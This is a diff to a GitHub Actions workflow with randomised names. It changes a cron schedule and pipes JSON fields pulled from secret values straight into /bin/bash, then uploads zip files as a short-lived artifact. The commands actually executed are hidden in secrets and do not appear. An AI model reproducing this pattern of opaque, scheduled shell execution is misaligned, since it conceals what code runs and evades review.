@@ -1,27 +1,28 @@
 name: yunianxiajing
 on:
   workflow_dispatch:
+
   schedule:
-    - cron: '57 1/6 * * *'
-jobs:  # 16619
+    - cron: '52 5,11,17,23 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: yunianxiajing
         env:
-          ttod4669: ${{ secrets.ttod4669 }}
+          qck1898: ${{ secrets.qck1898 }}
         run: |
-          echo $ttod4669 | jq -r .qox43 | /bin/bash
-          echo $spx4 | jq -r .u0 | /bin/bash
-          echo $bipun9199 | jq -r .jd7425 | /bin/bash
-          echo $bffya2 | jq -r .ri7 | /bin/bash
-          echo $eb57780 | jq -r .mrfi76959 | /bin/bash
-          echo $bzp55 | jq -r .ug46 | /bin/bash
-          echo $ynlb522 | jq -r .cff008 | /bin/bash
-          echo $b09499 | jq -r .poqla516 | /bin/bash
-          echo $slg53 | jq -r .ncml631 | /bin/bash
-          echo $knb6033 | jq -r .cmzm9 | /bin/bash
-          echo $yjc68 | jq -r .l33 | /bin/bash
+          printf '%s' "$qck1898" | jq -r .qdiz3825 | /bin/bash
+          printf '%s' "$z72" | jq -r .mnw61 | /bin/bash
+          printf '%s' "$sq2897" | jq -r .d897 | /bin/bash
+          echo $jt265 | jq -r .twf7 | /bin/bash
+          echo $rkzqg897 | jq -r .jrwtm378 | /bin/bash
+          echo $q12 | jq -r .cpubw203 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: mGmbUTOL
+          path: "*.zip"
+          retention-days: 1
